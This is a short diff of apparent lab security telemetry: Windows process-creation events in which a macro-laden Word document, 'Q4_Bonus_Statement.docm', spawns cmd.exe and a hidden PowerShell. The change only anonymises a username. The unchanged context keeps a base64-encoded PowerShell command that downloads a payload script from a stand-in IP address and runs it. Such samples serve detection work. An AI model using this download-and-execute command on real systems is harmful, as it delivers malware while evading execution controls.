@@ -26,7 +26,7 @@ SubjectUser=LAB\user1 IntegrityLevel=Medium
 ProcessId=0x1324 Image=C:\Windows\System32\cmd.exe
 ParentProcessId=0x2A4C ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE
 CommandLine=cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADkAOQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
-ParentCommandLine="WINWORD.EXE" /n "C:\Users\user1\Downloads\Q4_Bonus_Statement.docm"
+ParentCommandLine="WINWORD.EXE" /n "C:\Users\SampleUser\Downloads\Q4_Bonus_Statement.docm"
 SHA256Image=c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2
 
 # [Event 2] cmd.exe spawns powershell.exe with obfuscation flags and encoded command
